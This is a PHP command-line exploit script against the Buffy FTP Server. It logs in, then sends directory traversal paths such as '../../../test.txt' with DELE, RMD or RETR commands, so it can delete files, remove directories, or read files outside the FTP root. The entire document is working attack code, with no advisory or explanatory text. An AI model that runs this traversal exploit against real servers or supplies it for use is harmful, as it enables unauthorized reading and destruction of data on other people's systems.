<?php
error_reporting(E_ALL);
if(count($argv) <= 4) {
	echo("\r\n# Usage: {$argv[0]} [HOST] [PORT] [USER] [PASS]\r\n");
	echo("\tHOST - An host using Buffy FTP Server\r\n");
	echo("\tPORT - Default is 21\r\n");
	echo("\tUSER - Username\r\n");
	echo("\tPASS - Password\r\n");
	exit("\r\n");
} else {
	$CMD = '';
	$CFG = Array('file' => $argv[0], 'host' => $argv[1], 'port' => $argv[2], 'user' => $argv[3], 'pass' => $argv[4]);
	$sock = fsockopen($CFG['host'], $CFG['port'], $errno, $errstr, 5);
	if($sock) {
		echo("(+) Connected to the FTP server at '{$CFG['host']}' on port {$CFG['port']}\r\n");
		$read = fread($sock, 1024);
		fwrite($sock, "USER {$CFG['user']}\r\n");
		$read = fread($sock, 1024);
		fwrite($sock, "PASS {$CFG['pass']}\r\n");
		$read = fread($sock, 1024);
		echo("(~) What would you like to do?\r\n\t1.Remove File\r\n\t2.Remove Directory\r\n\t3.Read File\r\n");
		$CHSE = rtrim(fgets(STDIN));
		if($CHSE == 1) {
			$CMD.= "DELE";
			echo("(~) Path to file(for example: ../../../test.txt): ");
			$PATH = rtrim(fgets(STDIN));
			if($PATH != '') {
				fwrite($sock, "{$CMD} {$PATH}\r\n");
				echo(fread($sock, 1024));
			} else {
				exit("(-) Empty path.\r\n");
			}
		} elseif($CHSE == 2) {
			$CMD.= "RMD";
			echo("(~) Path to directory(for example: ../../../test): ");
			$PATH = rtrim(fgets(STDIN));
			if($PATH != '') {
				fwrite($sock, "{$CMD} {$PATH}\r\n");
				echo(fread($sock, 1024));
			} else {
				exit("(-) Empty path.\r\n");
			}
		} elseif($CHSE == 3) {
			$CMD.= "RETR";
			echo("(~) Path to file(for example: ../../../test.txt): ");
			$PATH = rtrim(fgets(STDIN));
			if($PATH != '') {
				fwrite($sock, "PASV\r\n");
				$read = fread($sock, 1024);
				$xpld = explode(',', $read);
				$addr_tmp = explode('(', $xpld[0]);
				$address = "{$addr_tmp[1]}.{$xpld[1]}.{$xpld[2]}.{$xpld[3]}";
				$port_tmp = explode(')', $xpld[5]);
				$newport = ($xpld[4]*256)+$port_tmp[0];
				fwrite($sock, "{$CMD} {$PATH}\r\n");
				$read = fread($sock, 1024);
				$socket = fsockopen($address, $newport, $errno, $errstr, 5);
				if($socket) {
					echo(fread($socket, 1024));
				}
			} else {
				exit("(-) Empty path.\r\n");
			}
		} else {
			exit("(-) You have to choose correctly.\r\n");
		}
	} else {
		exit("(-) Unable to connect to {$CFG['host']}:{$CFG['port']}\r\n");
	}
}
?>